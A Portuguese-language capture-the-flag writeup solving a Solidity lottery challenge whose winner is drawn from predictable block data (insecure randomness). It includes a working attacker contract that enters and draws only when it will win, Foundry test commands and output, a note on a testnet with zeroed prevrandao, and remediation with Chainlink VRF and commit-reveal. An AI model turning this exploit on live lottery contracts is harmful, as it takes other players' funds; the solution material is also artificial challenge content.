# Writeup: Desafio 01, Sorteio previsível

> ⚠️ **Spoiler.** Este documento traz a solução completa do desafio. Não distribua antes do exercício.

| | |
|---|---|
| **Categoria** | Smart contracts / Solidity |
| **Vulnerabilidade** | Aleatoriedade insegura (*Insecure Randomness*, [SWC-120](https://swcregistry.io/docs/SWC-120)) |
| **Dificuldade** | Intermediária |
| **Alvo** | `src/Sorteio.sol` |
| **Objetivo** | Ganhar o sorteio com **100% de certeza** (`test/Exploit.t.sol` passar) |

## TL;DR

`Sorteio.sortear()` escolhe o vencedor com `keccak256(block.timestamp, block.prevrandao, jogadores.length)`.
Os três valores são públicos e **idênticos para qualquer contrato executado no mesmo bloco**. Um contrato
atacante recalcula o número antes de entrar, só segue se o índice sorteado for o dele e, na mesma transação,
chama `entrar()` e `sortear()`. Quando o bloco não favorece, ele reverte e perde apenas o gas. Resultado:
o atacante nunca perde o bilhete e sempre leva o prêmio.

---

## 1. O desafio

Um sorteio on-chain simples:

- `entrar()`: paga exatamente **0,1** (ETH/XRP) e entra na lista `jogadores`.
- `sortear()`: com pelo menos **3** jogadores, **qualquer pessoa** pode chamar. O contrato escolhe um
  vencedor, envia o saldo inteiro para ele, limpa a lista e incrementa a `rodada`.

No `test/Exploit.t.sol`, dois jogadores honestos (alice e bob) já entraram. O hacker tem 1 ETH e controla o
contrato `Atacante`. O teste simula até 50 blocos (`vm.roll`, `vm.warp +12 s`, `vm.prevrandao`) e exige que
o atacante vença, terminando com **+0,2** de lucro (os bilhetes dos honestos).

## 2. Reconhecimento

O coração do contrato:

```solidity
function sortear() external {
    require(jogadores.length >= MIN_JOGADORES, "jogadores insuficientes");

    uint256 aleatorio = uint256(
        keccak256(abi.encodePacked(block.timestamp, block.prevrandao, jogadores.length))
    );
    address vencedor = jogadores[aleatorio % jogadores.length];
    // ... paga o vencedor
}
```

Perguntas que guiam a análise:

1. **Quem pode chamar `sortear()`?** Qualquer um, a qualquer momento depois de 3 jogadores. O atacante
   escolhe *quando* o sorteio acontece.
2. **De onde vem a "aleatoriedade"?** De `block.timestamp`, `block.prevrandao` e `jogadores.length`.
3. **Esses valores são secretos?** Não. Qualquer código que roda no mesmo bloco lê exatamente os mesmos
   valores.

## 3. A vulnerabilidade

A EVM é **determinística**: todo nó reexecuta cada transação e precisa chegar ao mesmo resultado. Por isso
não existe `random()` nativo, e toda fonte "aleatória" disponível on-chain é, na verdade, pública:

| Fonte | Por que falha |
|---|---|
| `block.timestamp` | Público; o validador tem margem para escolher |
| `block.prevrandao` | Igual para todos no bloco; o proponente conhece antes |
| `blockhash(block.number)` | Sempre `0` (o bloco atual ainda não tem hash) |
| `blockhash(block.number - 1)` | Já é público quando o bloco atual executa |
| `msg.sender`, `jogadores.length`, nonce | Controlados ou conhecidos pelo atacante |

O ponto-chave: **um contrato que chama outro executa no mesmo bloco e na mesma transação**. Então o
`Atacante` vê o mesmo `block.timestamp` e o mesmo `block.prevrandao` que o `Sorteio` verá um instante depois.
A única variável é `jogadores.length`, e essa o atacante também controla: depois que ele entrar, será `n + 1`,
e ele estará no último índice (`n`).

O próprio teste da Parte 1 prova isso: `test_vencedor_e_previsivel` calcula o vencedor **antes** de chamar
`sortear()` e acerta.

```bash
forge test --match-test test_vencedor_e_previsivel -vv
# Logs: Vencedor previsto: 0x328809Bc894f92807417D2dAD6b7C998c1aFdac6   (alice)
```

## 4. Exploração

### Ideia

1. Contar os jogadores atuais e somar 1 (nós).
2. Recalcular o mesmo hash que o `Sorteio` vai calcular.
3. Se `aleatorio % n` **não** for o nosso índice (`n - 1`), **reverter**: a transação falha, o bilhete
   volta e só se perde o gas.
4. Se for, entrar e sortear **na mesma transação**. Ninguém consegue entrar no meio.

### Código (`solucao/Atacante.sol`)

```solidity
function atacar() external payable {
    require(msg.sender == dono, "so o dono");

    // 1. Depois que entrarmos, seremos o último da lista.
    uint256 n = alvo.totalJogadores() + 1;
    require(n >= alvo.MIN_JOGADORES(), "poucos jogadores");

    // 2. Mesmos inputs que o Sorteio usa: estamos no mesmo bloco, então são idênticos.
    uint256 aleatorio = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, n)));

    // 3. Só seguimos se o índice sorteado for o nosso.
    require(aleatorio % n == n - 1, "nao e a nossa vez");

    // 4. Entrar + sortear de forma atômica.
    alvo.entrar{value: msg.value}();
    alvo.sortear();
}
```

Detalhes que costumam derrubar quem está resolvendo:

- **Usar `n + 1`, não `n`.** O `Sorteio` calcula com o tamanho da lista *depois* que o atacante entrou.
- **`abi.encodePacked` com `uint256`.** O tipo precisa bater exatamente; `block.timestamp`, `block.prevrandao`
  e `n` são todos `uint256`.
- **O contrato precisa de `receive()`.** O prêmio é enviado com `call`; sem `receive()` o pagamento falha e
  `sortear()` reverte.
- **Atomicidade.** Se `entrar()` e `sortear()` forem transações separadas, outro jogador (ou bot) pode entrar
  entre as duas e mudar `jogadores.length`.

### A conta

Com `n` jogadores após a entrada, a chance de o hash cair no índice do atacante em um bloco qualquer é `1/n`.
Com alice e bob, `n = 3`: em média **3 blocos** de tentativas. Cada tentativa que não favorece é uma
transação revertida e custa só o gas. O bilhete nunca é perdido.

Na prática nem é preciso gastar gas com tentativas: o atacante pode simular `atacar()` com `eth_call` contra
o bloco pendente e só enviar a transação quando a simulação passar.

### Prova

```bash
cp solucao/Atacante.sol src/Atacante.sol
sed -i '' 's#"../src/Sorteio.sol"#"./Sorteio.sol"#' src/Atacante.sol   # Linux: sed -i
forge test --match-contract ExploitTest -vv
```

```
[PASS] test_atacante_sempre_ganha() (gas: 220394)
Logs:
  Ganhou na tentativa 7
```

As 6 primeiras tentativas reverteram, sem perder nada além de gas. Na 7ª o atacante entrou, sorteou, ganhou
e sacou o lucro: `hacker.balance == saldoInicial + 0,2`.

## 5. Particularidade da XRPL EVM Testnet

O dApp deste desafio está configurado para a **XRPL EVM Testnet** (chainId `1449000`). Consultando o RPC da
rede, o campo `mixHash` (que vira `block.prevrandao`) vem **sempre zerado**:

```
mixHash 0x0000000000000000000000000000000000000000000000000000000000000000
```

Ou seja, nessa rede a semente é só `keccak256(block.timestamp, 0, n)`, ainda mais fraca. Como os blocos saem
a cada ~6 s, qualquer bot off-chain consegue prever o vencedor dos próximos blocos sem nem precisar de um
contrato atacante.

## 6. Casos reais

- **SmartBillions (2017):** loteria que usava `blockhash` de forma explorável; atacantes levaram ~400 ETH.
- **Fomo3D, airdrop (2018):** o sorteio do airdrop usava dados do bloco; contratos atacantes só participavam
  quando sabiam que ganhariam.
- Diversas loterias e jogos na BSC e em outras redes EVM repetiram o mesmo erro.

## 7. Correção

### a) Chainlink VRF (recomendado)

Aleatoriedade com prova criptográfica, entregue em uma transação **posterior** à que pede o número:

```solidity
function sortear() external {
    require(jogadores.length >= MIN_JOGADORES, "jogadores insuficientes");
    require(!sorteando, "ja sorteando");
    sorteando = true; // bloqueia entrar() até o resultado chegar
    s_vrfCoordinator.requestRandomWords(/* keyHash, subId, confirmações, gas, numWords */);
}

function fulfillRandomWords(uint256, uint256[] calldata palavras) internal override {
    address vencedor = jogadores[palavras[0] % jogadores.length];
    // pagar, resetar, sorteando = false
}
```

A trava `sorteando` é essencial. Sem ela, o atacante vê a resposta do VRF no mempool e entra antes do
callback, mudando `jogadores.length` a seu favor.

### b) Commit-reveal

Cada jogador envia `keccak256(segredo)` ao entrar e revela o segredo depois; a semente combina todos os
segredos. A fraqueza é que o **último a revelar** pode desistir se o resultado não o favorecer. Isso exige
um depósito que é perdido por quem não revelar.

### c) O que **não** resolve

- `require(msg.sender == tx.origin)` ou `extcodesize == 0` para bloquear contratos: um bot off-chain (ou o
  próprio validador) continua prevendo o resultado.
- Misturar mais campos do bloco (`block.number`, `block.coinbase`, `gasleft()`…): continuam sendo públicos
  ou controláveis.

## 8. Bônus: DoS no pagamento

`sortear()` paga o vencedor com `call` e exige sucesso. Se o vencedor for um contrato **sem `receive()`**
(ou que reverta de propósito), o sorteio reverte e a rodada **trava para sempre**. A correção é o padrão
*pull payment*: registrar `premios[vencedor] += premio` e oferecer uma função `sacar()`.

## 9. Lições

- **Regra de ouro:** se a fonte de aleatoriedade é legível on-chain no momento do uso, ela é previsível.
- Funções que qualquer um pode chamar dão ao atacante o controle do *quando*.
- Transações que revertem são tentativas grátis: o atacante só paga gas quando erra.
- Separar a decisão (pedido) do resultado (callback) e travar o estado no meio é o que torna o sorteio justo.

## Referências

- [SWC-120: Weak Sources of Randomness from Chain Attributes](https://swcregistry.io/docs/SWC-120)
- [Chainlink VRF](https://docs.chain.link/vrf)
- [XRPL EVM: documentação](https://docs.xrplevm.org)
- Arquivos do desafio: `src/Sorteio.sol`, `solucao/Atacante.sol`, `test/Exploit.t.sol`, `test/Sorteio.t.sol`
